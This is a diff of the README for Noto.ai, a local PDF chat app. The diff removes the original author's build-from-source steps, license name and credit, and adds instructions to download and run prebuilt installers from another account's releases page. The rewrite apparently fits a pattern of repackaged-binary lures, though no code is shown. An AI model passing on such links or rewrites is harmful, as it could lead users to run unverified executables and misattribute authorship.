@@ -1,108 +1,74 @@
-# Noto.ai 📝🧠
+# 🤖 noto-ai-app - Your AI-Powered Document Assistant
 
-Your intelligent, AI-powered PDF research companion — powered locally by **LLaMA 3** via Ollama.
-
----
-
-## 🌟 Overview
-
-**Noto.ai** transforms static PDFs into **interactive, AI-narrated research companions**. Ask questions, summarize content, and interact naturally — all while keeping your AI engine **local and private** using Meta’s LLaMA 3 via [Ollama](https://ollama.com/).
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Language-Python-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/Framework-Kivy-red?style=flat-square&logo=streamlit" />
-  <img src="https://img.shields.io/badge/Model-LLaMA%203-blueviolet?style=flat-square" />
-</p>
+## 📥 Download Now
+[![Download Noto.ai](https://img.shields.io/badge/Download%20Noto.ai-v1.0-blue?style=for-the-badge)](https://github.com/Anjrz/noto-ai-app/releases)
 
 ---
 
-## 🚀 Features
+## 🚀 Getting Started
+Noto.ai is a local AI-powered PDF assistant. It lets you chat with documents, ask questions, and get instant summaries—all offline using LLaMA 3 via Ollama. This application is built with Python and Kivy to give you a clean desktop interface. It is perfect for students, researchers, and professionals looking to extract insights from complex PDFs efficiently and privately.
 
-| Feature              | Description                                 |
-| -------------------- | ------------------------------------------- |
-| 📄 PDF Reader        | Upload and parse any PDF                    |
-| 🤖 Chat with PDF     | Interact with your documents using LLaMA 3  |
-| 🧠 Summarization     | AI-generated summaries of sections or pages |
-| 📍 Search & Navigate | Quickly find terms and content              |
-| 🌙 Dark Mode         | Kivy-powered user-friendly interface        |
-| 🖥️ Works Offline    | No cloud required – local model inference   |
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- **Memory (RAM):** At least 4 GB required.
+- **Storage:** Minimum of 500 MB free space.
+- **Python:** Version 3.8 or later is recommended. If not installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Graphics:** A modern GPU is beneficial for better performance.
 
----
+## 📦 Features
+- **Chat with PDFs:** Interact with your documents in a conversational way.
+- **Instant Summaries:** Get quick overviews of lengthy documents.
+- **Offline Functionality:** Use the app without an internet connection.
+- **Privacy Focused:** Your data remains on your device—no upload needed.
+- **User-Friendly Interface:** Simple navigation ensures a smooth experience.
 
-## 🛠️ Tech Stack
+## 📂 Download & Install
+To get started with Noto.ai:
+1. **Visit the Releases Page:** Click [here to download](https://github.com/Anjrz/noto-ai-app/releases) the latest version.
+2. **Select Your OS:** Choose the version compatible with your operating system, whether Windows, macOS, or Linux.
+3. **Download the Installer:** Click on the installer file to start the download. It typically ends with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux users.
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
+   - **macOS:** Open the downloaded `.dmg` file. Drag the Noto.ai app into the Applications folder.
+   - **Linux:** Make the `.AppImage` executable. You can do this by right-clicking, selecting "Properties," then "Permissions," and checking "Allow executing file as a program." Double-click the file to run it.
+5. **Launch the App:** Once installed, find Noto.ai in your applications and start using it.
 
-* **UI:** Python + Kivy + KivyMD
-* **AI Backend:** LLaMA 3 via [Ollama](https://ollama.com)
-* **PDF Parsing:** `PyMuPDF` (`fitz`)
-* **Text-to-AI:** Local API calls to `http://localhost:11434/api/generate`
+## 📊 How to Use Noto.ai
+After opening Noto.ai:
+1. **Upload a PDF:** Click the "Upload" button to select your document.
+2. **Ask Questions:** Type your queries in the chat box. Noto.ai will respond with precise answers based on the document content.
+3. **Get Summaries:** Click on the summary option to receive a comprehensive overview of the document.
+4. **Explore Various Features:** Feel free to navigate through the interface to explore additional tools and functionalities.
 
----
+## 📝 Contributing
+If you want to contribute to this project, please fork the repository and create a pull request. Your suggestions and improvements are welcome. Check the issues page for active discussions and feature requests.
 
-## 📦 Installation
+## 🌐 Topics
+This project covers various topics that help improve its functionality:
+- ai-assistant
+- chat-with-pdf
+- document-summarizer
+- kivy
+- llama3
+- local-ai
+- offline-ai
+- ollama
+- open-source-project
+- pdf-chatbot
+- pdf-reader
+- python-gui
+- research-tool
+- semantic-search
 
-### 🐍 Python Environment
-
-```bash
-git clone https://github.com/sagnikdatta2k6/noto-ai-app.git
-cd noto-ai-app
-pip install -r requirements.txt
-```
-
-### 🤖 Ollama Setup (LLaMA 3)
-
-1. Install [Ollama](https://ollama.com)
-2. Pull LLaMA 3 model:
-
-   ```bash
-   ollama pull llama3
-   ```
-3. Run the model:
-
-   ```bash
-   ollama run llama3
-   ```
-
-### ▶️ Run the App
-
-```bash
-python main.py
-```
-
----
-
-### Workflow
-
-![diagram](https://github.com/user-attachments/assets/49dfbec6-ee8c-4c38-a2fa-5ee70d825a50)
-
-
----
-
-## ⚙️ .env Configuration (Optional)
-
-If needed, configure `.env`:
-
-```
-OLLAMA_API_URL=http://localhost:11434
-MODEL_NAME=llama3
-```
----
-
-## 🤝 Contributing
-
-1. Fork the repo
-2. `git checkout -b feature/improve-ui`
-3. Make your changes
-4. Submit a pull request ✨
-
----
+## 📞 Support
+If you encounter any issues or have questions, feel free to open an issue on GitHub or reach out through our community channels.
 
 ## 📜 License
+Noto.ai is an open-source project. You can freely use, modify, and distribute it under the terms of the license provided in this repository.
 
-MIT License. See [LICENSE](LICENSE).
+## 🔗 Additional Resources
+For a more in-depth guide, check out our [Wiki](https://github.com/Anjrz/noto-ai-app/wiki) where you can find FAQs, advanced usage tips, and troubleshooting steps. 
 
 ---
 
-## 🙋‍♂️ Author
-
-**Sagnik Datta**
-🌐 [GitHub](https://github.com/sagnikdatta2k6)
+Remember, the power of instant document insight is at your fingertips. Enjoy your experience with Noto.ai!
